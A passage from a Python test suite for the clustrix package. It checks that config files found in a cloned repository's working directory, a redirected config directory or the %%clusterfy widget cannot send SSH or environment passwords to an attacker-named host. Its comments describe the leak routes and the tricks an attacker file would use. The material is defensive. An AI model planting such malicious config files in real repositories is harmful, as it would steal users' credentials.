        with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
            yield

    generator = suspended()
    next(generator)
    during = ClusterConfig(cluster_type="ssh", cluster_host=host)
    assert get_config_source(during) == CONFIG_SOURCE_WORKING_DIRECTORY

    del generator
    gc.collect()

    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}
    assert (
        config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {}
    ), "an abandoned generator poisoned a hostname permanently"
    assert _plain_construction_is_trusted(host)


def test_a_loader_that_read_the_file_still_denies_the_host_permanently(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """And the narrowing must not cost the control it exists to protect.

    ``ProfileManager`` reads its store itself, so it is the loader and it
    says so: the hostname in a bundle it found outside ``~/.clustrix`` is
    refused for the life of the process, and a rebuild through
    ``configure(**asdict(cfg))`` cannot launder it. This is the assertion
    that fails if "only a loader may write the record" is implemented by
    nobody writing it.
    """
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    redirected = tmp_path / "cloned-repository" / "attacker-config"
    redirected.mkdir(parents=True)
    (redirected / "profiles.yml").write_text(
        _profile_bundle(attacker_server), encoding="utf-8"
    )

    from clustrix.profile_manager import ProfileManager

    profile = ProfileManager(config_dir=str(redirected)).profiles["Cluster"]
    assert profile.cluster_host == attacker_server.host

    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        attacker_server.host: config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    }

    from dataclasses import asdict

    configure(**asdict(profile))
    assert (
        get_config_source(get_config())
        == config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR
    )

    authenticated = _attempt_connection()
    assert attacker_server.authentications == [], (
        "narrowing the permanent record let a profile bundle found outside "
        "~/.clustrix launder its hostname: " + repr(attacker_server.authentications)
    )
    assert not authenticated


# --------------------------------------------------------------------------
# The process-wide record has to cover the read it was built for.
# --------------------------------------------------------------------------


def test_the_automatic_working_directory_search_declares_itself_process_wide(
    tmp_path, monkeypatch
):
    """A8. RED before the fix: the record stays ``{}`` for the whole read.

    The automatic search reaches the file through ``load_config``, whose own
    declaration is ``explicit-file`` -- the caller named the path, from its
    point of view -- and corrects the provenance afterwards with
    ``set_config_source``. ``explicit-file`` is trusted, so nothing was ever
    written to ``_UNTRUSTED_LOADS_IN_FLIGHT``: the guard covered
    ``ProfileManager._restore`` and the widget's Load button and gave *zero*
    cover to the working-directory and redirected searches, which are the two
    reads it exists for. Latent, because the search builds one object on its
    own thread -- but the docstring asserted otherwise, and a false invariant
    is the thing the next change is built on.

    Observed without touching the clock or patching anything: ``clustrix.yml``
    is a real FIFO, so the loader's own ``open()`` blocks in the reader thread
    until this test supplies the bytes. The read is genuinely in progress
    while the assertions run.
    """
    import os
    import threading
    import time

    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    fifo = repo / "clustrix.yml"
    os.mkfifo(fifo)
    monkeypatch.chdir(repo)

    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}

    def search():
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            config_module._load_default_config()

    observed = {}
    reader = threading.Thread(target=search)
    reader.start()
    try:
        deadline = time.time() + 10
        while time.time() < deadline and not config_module._UNTRUSTED_LOADS_IN_FLIGHT:
            time.sleep(0.01)
        observed["record"] = dict(config_module._UNTRUSTED_LOADS_IN_FLIGHT)
        observed["delegated"] = get_config_source(
            _built_in_a_thread("built.while.the.search.was.reading.example")
        )
    finally:
        # Unblock the loader whatever happened above. Non-blocking so a
        # reader that never arrived raises instead of hanging the suite.
        payload = b"cluster_type: local\n"
        deadline = time.time() + 10
        while True:
            try:
                writer = os.open(fifo, os.O_WRONLY | os.O_NONBLOCK)
            except OSError:
                if time.time() > deadline:
                    raise
                time.sleep(0.01)
            else:
                os.write(writer, payload)
                os.close(writer)
                break
        reader.join(30)

    assert observed["record"] == {CONFIG_SOURCE_WORKING_DIRECTORY: 1}, (
        "the automatic working-directory search does not declare itself in "
        "the process-wide record, so the thread guard does not cover it"
    )
    assert observed["delegated"] == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}


def test_an_inner_read_ending_does_not_end_the_outer_one():
    """M5. Kills: ``pop`` on exit instead of decrementing the count.

    ``test_the_process_wide_record_does_not_outlive_the_read`` cannot see
    this: it checks ``{WD: 2}`` inside both blocks and ``{}`` after both, and
    a ``pop`` satisfies each of those. The window the table exists for is the
    one in between -- inner finished, **outer still reading** -- where a
    ``pop`` clears the record and a construction the outer loader delegated
    to a thread comes back ``runtime``, i.e. trusted.
    """
    with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
        with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
            pass
        assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {
            CONFIG_SOURCE_WORKING_DIRECTORY: 1
        }, "a nested read ending cleared the record while the outer one ran"
        delegated = _built_in_a_thread("delegated.by.the.outer.read.example")

    assert get_config_source(delegated) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}


def test_the_process_wide_record_is_written_under_its_lock():
    """M6. Kills: replacing ``_UNTRUSTED_LOADS_LOCK`` with ``nullcontext``.

    The record is a plain dict shared by every thread, and the whole point of
    it is that threads read it while other threads write it. Holding the lock
    here must therefore stop a read from being declared; with the lock gone
    the declaration sails straight through and the test sees it.
    """
    import threading

    entered = threading.Event()

    def declare():
        with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
            entered.set()

    thread = threading.Thread(target=declare)
    config_module._UNTRUSTED_LOADS_LOCK.acquire()
    try:
        thread.start()
        assert not entered.wait(0.5), (
            "a read was declared while the record's lock was held by another "
            "thread: the record is not actually locked"
        )
    finally:
        config_module._UNTRUSTED_LOADS_LOCK.release()

    thread.join(30)
    assert entered.is_set()
    assert config_module._UNTRUSTED_LOADS_IN_FLIGHT == {}


def test_two_overlapping_untrusted_reads_answer_in_a_fixed_order():
    """M7. Kills: ``next(iter(...))`` in place of ``sorted(...)[0]``.

    Two untrusted reads can overlap, and the fallback names one of them. Which
    one changes the recorded source and therefore the message the user is
    shown, so it may not depend on dict insertion order -- the same pair of
    reads entered in the other order has to give the same answer. Insertion
    order is exactly what ``next(iter(...))`` returns, so the two orderings
    below disagree under the mutation and agree under ``sorted``.
    """
    redirected = config_module.CONFIG_SOURCE_REDIRECTED_CONFIG_DIR

    with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
        with config_module.config_built_from_file(redirected):
            first = _built_in_a_thread("overlapping.reads.one.example")

    with config_module.config_built_from_file(redirected):
        with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
            second = _built_in_a_thread("overlapping.reads.two.example")

    assert get_config_source(first) == get_config_source(second), (
        "which of two overlapping untrusted reads is named depends on the "
        "order they were entered in"
    )
    assert get_config_source(first) == redirected


# --------------------------------------------------------------------------
# The fifth leak route: the ``%%clusterfy`` widget's own file discovery.
#
# ``EnhancedClusterConfigWidget._initialize_configs`` calls
# ``detect_config_files()``, which globs the *working directory* for
# ``clustrix.yml``, ``clustrix.yaml``, ``config.yml`` and ``config.yaml``.
# The last two are not in ``_load_default_config``'s candidate list at all,
# so ``./config.yml`` is tainted by nothing, warns about nothing, and lands
# in ``self.configs`` as a raw dict carrying no provenance whatsoever. Apply
# then hands that dict to ``configure()``, which means "the user typed this".
#
# Neither remaining friction stops an attacker. The widget re-emits ``name``,
# which ``configure`` rejects -- so the file ships ``name: ""``, because
# empty values are stripped before the call. And the host-key check is
# satisfied by ``ssh_host_key_policy: auto_add``, which is the user's own
# documented setting.
# --------------------------------------------------------------------------


def _clusterfy_widget_applying(config_name):
    """Drive the real ``%%clusterfy`` widget: pick the config, press Apply."""
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    assert config_name in widget.config_dropdown.options, (
        f"the widget did not offer {config_name!r}: "
        f"{widget.config_dropdown.options}"
    )
    widget.config_dropdown.value = config_name
    widget._on_apply_config(None)
    return widget


def test_the_clusterfy_widget_does_not_trust_a_config_file_it_found_in_the_cwd(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """The reproduction. RED before the fix: ``runtime``, and the leak.

    Measured before it: ``taint_after_import={}``, the dropdown offers the
    file, ``source=runtime``, ``trusted=True``, and the sentinel reaches the
    attacker's server.
    """
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    (repo / "config.yml").write_text(
        _config_text(attacker_server, name='""'), encoding="utf-8"
    )
    monkeypatch.chdir(repo)

    # The user's own documented setting, and the only friction the widget
    # does not carry across by itself: ``_save_config_from_widgets`` never
    # emits ``ssh_host_key_policy``, so it has to already be in force for the
    # connection to get as far as offering a password. Setting it here is a
    # plain ``configure()`` call naming no host, so it stamps nothing.
    configure(ssh_host_key_policy="auto_add")

    # Nothing warns and nothing is tainted: ``config.yml`` in the working
    # directory is not a file the automatic search looks at.
    with warnings.catch_warnings():
        warnings.simplefilter("error")
        config_module._load_default_config()
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {}
    assert get_config().cluster_host != attacker_server.host

    _clusterfy_widget_applying("config")

    assert get_config().cluster_host == attacker_server.host

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "the %%clusterfy widget applied a config.yml it found in the working "
        "directory as if the user had typed it: "
        + repr(attacker_server.authentications)
    )
    assert not authenticated
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY


def test_the_clusterfy_widget_still_trusts_a_config_file_in_the_config_dir(
    attacker_server, env_file
):
    """And the fix does not turn Apply into a button that refuses everything.

    The identical file in ``~/.clustrix`` is the user's own: they had to go
    there to put it. This is the documented workflow, and it has to keep
    authenticating -- a security fix that blocks it gets reverted.
    """
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    config_dir = pathlib.Path.home() / ".clustrix"
    config_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    (config_dir / "config.yml").write_text(
        _config_text(attacker_server, name='""'), encoding="utf-8"
    )

    # The user's own documented setting, and the only friction the widget
    # does not carry across by itself: ``_save_config_from_widgets`` never
    # emits ``ssh_host_key_policy``, so it has to already be in force for the
    # connection to get as far as offering a password. Setting it here is a
    # plain ``configure()`` call naming no host, so it stamps nothing.
    configure(ssh_host_key_policy="auto_add")

    _clusterfy_widget_applying("config")

    assert get_config().cluster_host == attacker_server.host

    authenticated = _attempt_connection()

    assert authenticated, "the documented widget workflow stopped working"
    assert get_config_source(get_config()) == CONFIG_SOURCE_USER_CONFIG_DIR
    assert attacker_server.authentications == [("victim", "password")]


# ---------------------------------------------------------------------------
# The choke point itself (issue #167, round thirteen).
#
# Seven routes were closed one at a time. Seven call sites for one decision
# is not a bug with instances, it is a decision with no home, so the decision
# now has one: ``clustrix.credential_release.release_credential(target)``,
# whose first positional parameter is the recipient. These tests are about
# the two objects that make the unsafe call hard to *write* rather than
# merely wrong.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "nobody",
    ["", "   ", ".", "\t", None, 0, 2130706433, object()],
    ids=["empty", "spaces", "dot", "tab", "none", "zero", "yaml-hex-int", "object"],
)
def test_a_target_cannot_name_nobody(nobody):
    """Route 1 stops being a comparison that can go wrong.

    The original leak was ``credential_host in target`` with an empty
    ``credential_host``. Under the gate the recipient is a *constructor
    argument*, and one that does not normalise to a hostname raises: there
    is no object to pass, so there is no release to get wrong. ``0`` and
    ``2130706433`` are the shapes PyYAML produces from an unquoted ``0`` or
    ``0x7f000001`` in a configuration file.
    """
    with pytest.raises(ValueError):
        CredentialTarget(
            hostname=nobody,
            username="victim",
            described_as="a test",
        )


def test_a_config_naming_no_host_makes_no_target_at_all():
    """``str(None)`` is ``"None"``, and ``"None"`` is a perfectly good hostname.

    So ``for_config`` on a config with no ``cluster_host`` built a target
    naming the literal host ``None`` instead of raising, and the
    ``ValueError`` that four call sites catch to mean "there is nobody to
    release a credential to" was never raised for the one case it is named
    after. The stringify is still there for the value it is for -- PyYAML
    hands back an ``int`` for an unquoted ``0x7f000001``, which has to reach
    ``__post_init__`` to be refused by it.
    """
    with pytest.raises(ValueError):
        CredentialTarget.for_config(ClusterConfig(username="victim"))

    # The stringify still does its job for the value it exists for.
    assert (
        CredentialTarget.for_config(
            ClusterConfig(cluster_host="hpc.example.edu"), hostname=2130706433
        ).hostname
        == "2130706433"
    )


def test_a_target_cannot_declare_its_own_provenance():
    """The keyword is gone, so the forgery cannot even be written.

    It could be, and it released: ``CredentialTarget(hostname=<anything>,
    provenance="runtime", ...)`` was handed the secret because the rule that
    needs provenance read it off the target and returned before consulting
    the config. A gate that asks a question whose answer the caller supplies
    is decoration, so provenance is derived and there is no parameter to
    fill in.
    """
    with pytest.raises(TypeError):
        CredentialTarget(  # type: ignore[call-arg]
            hostname="hpc.example.edu",
            username="victim",
            provenance="runtime",
            described_as="a test",
        )


def test_a_forged_provenance_cannot_outrank_the_config_that_was_also_passed(
    env_file, attacker_server
):
    """The G1 finding, at the level the decision is actually made.

    The hostname the auth chain connects to need not be
    ``config.cluster_host`` -- ``CredentialTarget.for_config(config,
    hostname=...)`` exists precisely for that -- and the provenance the
    target used to carry was the *config's*, because
    ``get_config_source`` only ever looks at ``config.cluster_host``. So a
    trusted config plus an override naming a host a working-directory file
    had already named released the password to that host. Provenance is now
    derived about the host being connected to, from the process record that
    no caller writes.
    """
    env_file(SSH_USERNAME="victim", SSH_PASSWORD=SENTINEL_PASSWORD)
    record_discovered_hostname(attacker_server.host, CONFIG_SOURCE_WORKING_DIRECTORY)
    config = ClusterConfig(cluster_host="hpc.example.edu", username="victim")
    assert get_config_source(config) in TRUSTED_CONFIG_SOURCES

    target = CredentialTarget.for_config(config, hostname=attacker_server.host)
    release = release_credential(target, provider="ssh", config=config)

    assert release.refusal is not None
    assert release.password is None
    assert not attacker_server.authentications


def test_fixed_service_may_only_name_a_service_compiled_into_clustrix():
    """ "Compiled in" is a claim about *which* host, so it is checked.

    A constructor that accepted any hostname while asserting that nothing
    untrusted could have chosen it would be the declared-provenance defect
    wearing a different hat.
    """
    with pytest.raises(ValueError):
        CredentialTarget.fixed_service("attacker.example", why="a test")

    assert (
        CredentialTarget.fixed_service(
            "huggingface.co", why="the HuggingFace Hub API"
        ).hostname
        == "huggingface.co"
    )


def test_a_target_may_name_no_username():
    """Not every provider has one, and the documented ``.env`` names none."""
    target = CredentialTarget(
        hostname="hpc.example.edu",
        username="",
        described_as="a test",
    )
    assert target.username == ""


def _a_target():
    return CredentialTarget(
        hostname="hpc.example.edu",
        username="victim",
        described_as="a test",
    )


def test_a_release_is_either_a_secret_or_a_reason():
    """Both, or neither, raises.

    "Neither" is the ``{"port": "22"}`` defect in a new costume: an object
    that is not a secret and not a reason, which each caller then reads as
    whichever suits it. "Both" is worse -- a caller that checks only
    ``password`` uses a credential this gate refused.
    """
    with pytest.raises(ValueError):
        CredentialRelease(target=_a_target())

    with pytest.raises(ValueError):
        CredentialRelease(
            target=_a_target(),
            method="stored-credential",
            password=SENTINEL_PASSWORD,
            refusal="not for you",
        )

    with pytest.raises(ValueError):
        CredentialRelease(
            target=_a_target(), key_path="/tmp/nowhere", refusal="not for you"
        )


def test_a_released_secret_has_to_say_where_it_came_from():
    """So that a log line can name the source of a secret it just used."""
    with pytest.raises(ValueError):
        CredentialRelease(target=_a_target(), password=SENTINEL_PASSWORD)


@pytest.mark.parametrize(
    "unknown",
    ["", "config", "Stored-Credential", "stored-credentials", "config-fields", None],
    ids=["empty", "prefix", "case", "plural", "near-miss", "none"],
)
def test_an_unrecognised_release_source_is_refused_rather_than_ignored(unknown):
    """``sources`` may only ever narrow, so a name it does not know raises.

    Killing M10. Ignoring an unknown member is the worst of the three
    options: ``sources=("stored-credentials",)`` -- one letter out -- would
    silently mean "every branch" under a loop that skips what it does not
    recognise, and a caller that meant to *narrow* would have widened. The
    auth chain's per-method messages depend on this narrowing being exact.
    """
    with pytest.raises(ValueError) as raised:
        release_credential(_a_target(), provider="ssh", sources=(unknown,))

    assert "release source" in str(raised.value)


def test_the_declared_branches_are_all_accepted():
    """The rule above is not simply "every tuple raises"."""
    for source in credential_release_module.RELEASE_SOURCES:
        release = release_credential(_a_target(), provider="ssh", sources=(source,))
        assert release.refusal is not None


def test_a_release_is_truthy_exactly_when_it_carries_a_secret():
    assert CredentialRelease(
        target=_a_target(), method="stored-credential", password=SENTINEL_PASSWORD
    )
    assert not CredentialRelease(target=_a_target(), refusal="not for you")


def test_a_target_built_from_a_config_takes_that_config_s_provenance(tmp_path):
    """Provenance is a fact about the hostname, and the gate derives it."""
    config = ClusterConfig(cluster_host="hpc.example.edu", username="victim")
    target = CredentialTarget.for_config(config)

    assert target.hostname == "hpc.example.edu"
    assert target.username == "victim"
    assert derived_provenance(config, target.hostname) == CONFIG_SOURCE_RUNTIME
    assert "hpc.example.edu" in target.described_as


# ---------------------------------------------------------------------------
# Route 6 through the *connection* path, not just the auth chain.
#
# ``ConnectionManager.setup_ssh_connection`` never consulted
# ``password_env_var`` at all -- it read the credential store and stopped.
# Now that every source is reached through one gate, the connection path
# honours the documented ``password_env_var`` setting, and honours it under
# exactly the same two rules as everything else.
# ---------------------------------------------------------------------------


#: Deliberately *not* ``SSH_PASSWORD``: that name is one of the credential
#: store's own environment variables, so setting it would exercise the
#: stored-credential branch and say nothing about ``password_env_var``.
ENV_PASSWORD_VAR = "CLUSTER_PASSWORD"


def _env_password_config_text(server):
    return _config_text(
        server, use_env_password="true", password_env_var=ENV_PASSWORD_VAR
    )


def test_the_environment_password_reaches_a_host_the_user_chose(
    attacker_server, env_file, monkeypatch
):
    """The positive control for the connection path's environment branch."""
    env_file()  # a credential file with nothing in it
    monkeypatch.setenv(ENV_PASSWORD_VAR, SENTINEL_PASSWORD)

    config_dir = get_config_dir()
    (config_dir / "config.yml").write_text(
        _env_password_config_text(attacker_server), encoding="utf-8"
    )
    config_module._load_default_config()

    assert _attempt_connection() is True
    assert attacker_server.authentications[-1] == ("victim", "password")


def test_a_working_directory_host_never_receives_the_environment_password(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """Route 6, driven all the way onto the wire.

    The repository's ``clustrix.yml`` names ``password_env_var`` as well as
    ``cluster_host``, so an ungated version reads an environment variable of
    the repository's choosing and sends it to a host of the repository's
    choosing. The server here accepts the sentinel and nothing else, so an
    empty authentication log is proof the secret never left.
    """
    env_file()
    monkeypatch.setenv(ENV_PASSWORD_VAR, SENTINEL_PASSWORD)

    project = tmp_path / "cloned-repository"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        _env_password_config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    assert get_config().cluster_host == attacker_server.host

    authenticated = _attempt_connection()

    assert attacker_server.authentications == [], (
        "the environment password reached a host named by the working "
        "directory: " + repr(attacker_server.authentications)
    )
    assert not authenticated


def test_a_target_alone_establishes_nothing_about_who_chose_the_host():
    """The gate decides with two facts, and only one of them is on the target.

    A bare target is a recipient and nothing else. Who chose that recipient
    is :func:`derived_provenance`'s answer, and with no config accompanying
    the request there is no record of a chooser at all -- which answers
    ``None``, which is not trusted, so the release fails closed rather than
    defaulting to the caller's word.
    """
    target = CredentialTarget(
        hostname="hpc.example.edu", username="victim", described_as="a test"
    )

    assert derived_provenance(None, target.hostname) is None
    assert derived_provenance(None, target.hostname) not in TRUSTED_CONFIG_SOURCES


def test_a_config_that_lost_its_stamp_makes_an_untrusted_target():
    """Fail closed on the input the gate *can* judge.

    ``get_config_source`` answers ``working-directory`` for an object with
    no record -- one restored by ``pickle``, one whose attribute was
    overwritten -- so a target built from it is untrusted rather than
    trusted by default. An absent value must never read as "chosen by you".
    """
    config = ClusterConfig(cluster_host="hpc.example.edu", username="victim")
    object.__delattr__(config, "_clustrix_config_source")

    target = CredentialTarget.for_config(config)

    assert derived_provenance(config, target.hostname) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )


# ---------------------------------------------------------------------------
# Route 6 at its original site: ``clustrix/validation.py``.
#
# ``ClusterConfig.get_env_password()`` had no host check and no provenance
# check, and ``run_comprehensive_validation`` fed its result straight into
# ``validate_cluster_auth`` -> ``paramiko.connect(hostname=
# config.cluster_host)``. It is deleted; the one honest use is a branch of
# the gate, reached with a target.
# ---------------------------------------------------------------------------


def _validation_config_text(server):
    return _config_text(
        server,
        ssh_port=server.port,
        use_env_password="true",
        password_env_var=ENV_PASSWORD_VAR,
    )


def test_the_validation_pass_never_sends_the_environment_password_to_a_found_host(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """RED before the gate: ``env_password: PASSED`` and the sentinel on the wire."""
    from clustrix.validation import run_comprehensive_validation

    env_file()
    monkeypatch.setenv(ENV_PASSWORD_VAR, SENTINEL_PASSWORD)

    project = tmp_path / "cloned-repository"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        _validation_config_text(attacker_server), encoding="utf-8"
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    results = run_comprehensive_validation(get_config())

    assert results["env_password"] is False
    assert attacker_server.authentications == [], (
        "validation.py sent the environment password to a host named by the "
        "working directory: " + repr(attacker_server.authentications)
    )


def test_the_validation_pass_still_checks_a_host_the_user_chose(
    attacker_server, env_file
):
    """The positive control for the same path: the feature still works."""
    from clustrix.validation import run_comprehensive_validation

    env_file()
    monkeypatch_free_env = get_config_dir()
    (monkeypatch_free_env / "config.yml").write_text(
        _validation_config_text(attacker_server), encoding="utf-8"
    )
    config_module._load_default_config()

    import os as _os

    _os.environ[ENV_PASSWORD_VAR] = SENTINEL_PASSWORD
    try:
        results = run_comprehensive_validation(get_config())
    finally:
        _os.environ.pop(ENV_PASSWORD_VAR, None)

    assert results["env_password"] is True
    assert attacker_server.authentications[-1] == ("victim", "password")


def test_the_config_object_no_longer_hands_out_the_environment_password():
    """The surface itself is gone, not merely unused.

    ``get_env_password`` was a public method with no host and no provenance
    in sight; leaving it in place would leave route 6 one caller away.
    """
    assert not hasattr(ClusterConfig, "get_env_password")


def test_bypassing_the_gate_raises():
    """Lock 3, proven from a module that is not the gate.

    This is the test that makes the third lock live rather than decorative.
    An eighth route written the old way -- reach into the store, get the
    bytes, apply them to whatever ``cluster_host`` says -- raises on its
    first run instead of being caught at review, or not.

    The guard is always on. It makes no reference to tests and behaves the
    same whether or not pytest is running: that is why it is a fact about
    which module may obtain a secret rather than production code knowing it
    is under test.
    """
    manager = credential_manager_module.get_credential_manager()

    with pytest.raises(RuntimeError) as raised:
        manager._ensure_credential_unchecked("ssh")

    message = str(raised.value)
    assert "release_credential" in message
    assert __name__ in message


def test_the_module_level_convenience_is_gone():
    """The other way in, and the one a developer would have found by grep."""
    assert not hasattr(credential_manager_module, "ensure_credential")


def test_importing_the_gates_own_helper_does_not_make_you_the_gate():
    """A frame check that passes by construction is not a lock.

    ``_stored_credential`` is importable, and the store's guard judged the
    frame above ``_ensure_credential_unchecked`` -- which is
    ``_stored_credential``'s own frame, in the gate's module, whoever
    called it. So ``from clustrix.credential_release import
    _stored_credential`` was a public store with an underscore on it. What
    separates the gate calling its own helper from somebody importing that
    helper is *which function* is calling, and that is now what is checked.
    """
    with pytest.raises(RuntimeError) as raised:
        credential_release_module._stored_credential("ssh")

    assert "release_credential" in str(raised.value)


def test_the_gate_can_still_obtain_the_credential_it_guards():
    """The lock above is not simply "nothing works".

    ``describe_credential`` reaches the same helper from inside the gate,
    and must keep doing so -- a guard that also blocked the one legitimate
    caller would be indistinguishable from a broken import.
    """
    assert credential_release_module.describe_credential("ssh") is not None


# ---------------------------------------------------------------------------
# Route 7: the write side.
#
# ``AuthenticationManager._offer_credential_storage`` offered to write
# ``SSH_HOST=<whatever cluster_host says>`` plus the password the user had
# just typed into ``~/.clustrix/.env``. A credential file naming a host
# exactly is rule 1, released unconditionally in every future process --
# so this manufactured a permanently trusted binding for a host the user
# never chose, in the one file every remedy text tells them to trust.
# ---------------------------------------------------------------------------


def _env_file_keys(path):
    """The setting names in a ``.env``, ignoring comments and values.

    Parsed rather than substring-matched, and only the *keys* are returned:
    a test that asserted on the file's text would put a credential-shaped
    literal in the assertion.
    """
    if not path.exists():
        return set()
    keys = set()
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            keys.add(line.split("=", 1)[0].strip())
    return keys


def test_an_untrusted_host_is_never_written_into_the_credential_file(
    env_file, tmp_path, monkeypatch
):
    """RED before the fix: ``SSH_HOST`` appears, naming the repository's host."""
    from clustrix.auth_manager import AuthenticationManager

    path = env_file()

    project = tmp_path / "cloned-repository"
    project.mkdir()
    (project / "clustrix.yml").write_text(
        "cluster_type: ssh\n"
        "cluster_host: named.by.the.repository\n"
        "username: victim\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(project)
    with pytest.warns(UserWarning):
        config_module._load_default_config()

    # If the storage offer is ever reached, this would be the answer -- so a
    # test that leaves it in place and still finds nothing written is
    # measuring the refusal rather than a declined prompt.
    monkeypatch.setattr("builtins.input", lambda *a, **k: "y")

    AuthenticationManager(get_config())._offer_credential_storage(SENTINEL_PASSWORD)

    assert "SSH_HOST" not in _env_file_keys(path), (
        "the interactive prompt wrote a permanent authorisation for a host "
        "named by the working directory"
    )
    assert "SSH_PASSWORD" not in _env_file_keys(path)


def test_the_credential_file_is_still_written_for_a_host_the_user_chose(
    env_file, monkeypatch
):
    """The positive control: the offer still works where it should."""
    from clustrix.auth_manager import AuthenticationManager

    path = env_file()

    config_dir = get_config_dir()
    (config_dir / "config.yml").write_text(
        "cluster_type: ssh\n" "cluster_host: chosen.example.edu\n" "username: victim\n",
        encoding="utf-8",
    )
    config_module._load_default_config()
    monkeypatch.setattr("builtins.input", lambda *a, **k: "y")

    AuthenticationManager(get_config())._offer_credential_storage(SENTINEL_PASSWORD)

    keys = _env_file_keys(path)
    assert "SSH_HOST" in keys
    assert "SSH_USERNAME" in keys
    assert "SSH_PASSWORD" in keys


# ---------------------------------------------------------------------------
# Route 3, structurally: provenance is an argument, not ambient context.
# ---------------------------------------------------------------------------


def test_a_loader_cannot_build_a_config_from_file_content_without_a_source():
    """``from_file_content(mapping)`` is a ``TypeError``.

    Every loader used to construct ``ClusterConfig(**parsed)`` and
    *remember* to wrap it in ``config_built_from_file``. ``ProfileManager``
    did not, and a profile store shipped by a repository came back stamped
    ``runtime``. There is now nothing to forget.
    """
    with pytest.raises(TypeError):
        ClusterConfig.from_file_content(  # type: ignore[call-arg]
            {"cluster_host": "named.by.the.repository"}
        )


def test_from_file_content_stamps_the_source_it_was_given():
    config = ClusterConfig.from_file_content(
        {"cluster_type": "ssh", "cluster_host": "named.by.the.repository"},
        CONFIG_SOURCE_WORKING_DIRECTORY,
    )

    assert get_config_source(config) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert stored_credential_is_for_config(config, {"password": SENTINEL_PASSWORD})


def test_from_file_content_survives_being_handed_to_another_thread():
    """The reason an argument beats a ContextVar.

    A ``ContextVar`` declaration does not cross a thread boundary: a loader
    that delegates its construction to a worker gets the *default*, which is
    ``runtime`` -- the trusted end. An argument goes wherever the call goes.
    """
    import concurrent.futures

    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
        config = pool.submit(
            ClusterConfig.from_file_content,
            {"cluster_type": "ssh", "cluster_host": "handed.to.a.worker"},
            CONFIG_SOURCE_WORKING_DIRECTORY,
        ).result()

    assert get_config_source(config) == CONFIG_SOURCE_WORKING_DIRECTORY


def test_from_file_content_still_names_the_offending_setting():
    """The loader's error message is about the user's file, not our internals."""
    with pytest.raises(ValueError) as raised:
        ClusterConfig.from_file_content(
            {"cleanup_remote_files": True},
            CONFIG_SOURCE_EXPLICIT_FILE,
            origin="/somewhere/clustrix.yml",
        )

    assert "/somewhere/clustrix.yml" in str(raised.value)
    assert "cleanup_remote_files" in str(raised.value)


def test_recording_a_discovered_hostname_is_the_one_public_name_for_the_claim():
    """And a trusted source records nothing: the map describes hosts nobody chose."""
    config_module.record_discovered_hostname(
        "found.in.the.working.directory", CONFIG_SOURCE_WORKING_DIRECTORY
    )
    config_module.record_discovered_hostname(
        "found.in.your.config.dir", CONFIG_SOURCE_USER_CONFIG_DIR
    )

    recorded = config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES
    assert recorded.get("found.in.the.working.directory") == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )
    assert "found.in.your.config.dir" not in recorded

    # There is deliberately no way to un-record one.
    assert not hasattr(config_module, "clear_taint")
    assert not hasattr(config_module, "forget_discovered_hostname")


def test_recording_a_hostname_refuses_a_source_that_does_not_exist():
    """A typo may not invent a source that is neither trusted nor untrusted."""
    with pytest.raises(ValueError):
        config_module.record_discovered_hostname("somewhere", "totally-fine-honest")


def test_opening_the_clusterfy_widget_taints_a_host_it_found_in_the_cwd(
    attacker_server, tmp_path, monkeypatch
):
    """Route 5's other half: the taint lands at *discovery*, not at Apply.

    ``%%clusterfy`` carries raw dicts rather than ``ClusterConfig`` objects,
    so nothing about building a config could ever have recorded what it
    read. Until now the provenance was only applied if the user pressed
    Apply -- so merely opening the widget in a cloned repository put a
    hostname in front of the user, offered it in a dropdown, and recorded
    nothing at all. ``record_discovered_hostname`` is the one public name
    for "a file, not a person, named this host", and the widget calls it per
    file for exactly this reason.

    The assertion is about a *separate* config object built afterwards in
    Python: the hostname is what was refused, not the widget's dict.
    """
